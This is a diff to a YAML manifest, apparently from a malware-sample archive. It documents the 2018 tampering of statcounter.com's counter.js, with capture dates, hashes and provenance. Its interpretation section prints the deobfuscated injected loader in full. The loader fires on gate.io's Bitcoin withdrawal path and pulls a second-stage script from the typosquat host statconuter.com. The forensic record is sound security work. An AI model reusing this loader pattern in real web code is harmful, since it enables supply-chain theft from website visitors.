@@ -1,10 +1,122 @@
 schema_version: 1
-samples: []
-unresolved:
+interpretation:
+  - >-
+    The artifact is a CDN URL, so the sample is whatever statcounter.com returned at a moment inside
+    the window. The Archive holds 68 distinct captures across 2018-11-03 to 2018-11-06; only two
+    distinct bodies come back, and one of them is tampered.
+  - >-
+    The capture at 2018-11-03 07:46 still matches the pre-window baseline byte for byte and the
+    capture at 11:53 does not, which places the change on the morning of 3 November without relying
+    on any report. The captures on 2018-10-04 and 2018-12-07 agree with each other and not with the
+    tampered one.
+  - >-
+    The injection is 573 bytes at offset 13657, packed with the Dean Edwards packer. Unpacked, it
+    reads: myselfloc=""+document.location; if(myselfloc.indexOf('myaccount/withdraw/BTC')>-1){ var
+    ga=document.createElement('script'); ga.src='https://www.statconuter.com/c.php';
+    ga.setAttribute('async','true'); document.documentElement.firstChild.appendChild(ga) }
+  - >-
+    It is a targeted trigger rather than a broad skimmer: the second stage loads only for a visitor
+    whose URL contains myaccount/withdraw/BTC, the Bitcoin withdrawal path on gate.io. The host it
+    loads from, statconuter.com, is a transposition typosquat of statcounter.com.
+samples:
+  - artifact_id: statcounter
+    phase: before
+    classification: clean
+    filename: counter.js
+    path: statcounter/before/counter.js
+    sha256: 03da92f035c699a414e7379fc4e431b20d29e4901ed6b1172eb30f2d7308c2ca
+    size: 28803
+    source:
+      url: https://web.archive.org/web/20181004010225id_/https://www.statcounter.com/counter/counter.js
+      original_url: https://www.statcounter.com/counter/counter.js
+      kind: web_archive_capture
+      retrieved_at: '2026-09-03T01:42:10Z'
+    verification:
+      status: exact
+      basis:
+        - web_archive_replay
+        - measured_sha256
+      evidence:
+        - fetched_from_web_archive_id_replay
+        - measured_sha256_and_size
+    notes:
+      - The baseline the injection is measured against. Contains no reference to statconuter.com.
+    subject: statcounter
+    commit: '20181004010225'
   - artifact_id: statcounter
     phase: during
-    status: unavailable
-    hashes: []
-    locations: []
-    attempts: []
-    last_attempted_at: '2026-08-10T15:09:05.441Z'
+    classification: malicious
+    filename: counter.js
+    path: statcounter/during/counter.js
+    sha256: 31b819377de193d2ff6e0fe48959edf1456288a02cb0f0ae312386b05b39336d
+    size: 29377
+    source:
+      url: https://web.archive.org/web/20181103115308id_/https://www.statcounter.com/counter/counter.js
+      original_url: https://www.statcounter.com/counter/counter.js
+      kind: web_archive_capture
+      retrieved_at: '2026-09-03T01:42:10Z'
+    verification:
+      status: exact
+      basis:
+        - web_archive_replay
+        - measured_sha256
+      evidence:
+        - fetched_from_web_archive_id_replay
+        - measured_sha256_and_size
+        - differs_from_captures_on_both_sides_of_the_window
+    notes:
+      - The served file as statcounter.com delivered it on 2018-11-03.
+    subject: statcounter
+    commit: '20181103115308'
+  - artifact_id: statcounter
+    phase: during
+    classification: malicious
+    filename: injected-block.js
+    path: statcounter/during/injected-block.js
+    sha256: a51596cb4a0461f7a83f0c304440f0df7cec8e4cbf604eee0130e07fb272afad
+    size: 574
+    source:
+      url: https://web.archive.org/web/20181103115308id_/https://www.statcounter.com/counter/counter.js
+      original_url: https://www.statcounter.com/counter/counter.js
+      kind: extracted_from_recovered_sample
+      retrieved_at: '2026-09-03T01:42:10Z'
+    verification:
+      status: payload_only
+      basis:
+        - measured_sha256
+        - file_format_confirmed
+      evidence:
+        - extracted_by_diff_against_adjacent_capture
+        - measured_sha256_and_size
+        - parses_as_valid_javascript
+    notes:
+      - >-
+        The 573 injected bytes verbatim, with a trailing newline added. Not a file the CDN served on
+        its own.
+    subject: statcounter
+    commit: '20181103115308'
+  - artifact_id: statcounter
+    phase: during
+    classification: malicious
+    filename: injected-block-deobfuscated.js
+    path: statcounter/during/injected-block-deobfuscated.js
+    sha256: 1d8341fd6ce4a6df955c922ec4132b14f3b456a5a8b89d79ce4cf1fc33400e44
+    size: 250
+    source:
+      url: https://web.archive.org/web/20181103115308id_/https://www.statcounter.com/counter/counter.js
+      original_url: https://www.statcounter.com/counter/counter.js
+      kind: extracted_from_recovered_sample
+      retrieved_at: '2026-09-03T01:42:10Z'
+    verification:
+      status: verification_material
+      basis:
+        - measured_sha256
+      evidence:
+        - unpacked_from_the_held_injected_block
+        - measured_sha256_and_size
+    notes:
+      - >-
+        The packed loader after unpacking its Dean Edwards dictionary. A derivation for reading, not
+        served bytes.
+    subject: statcounter
+    commit: '20181103115308'
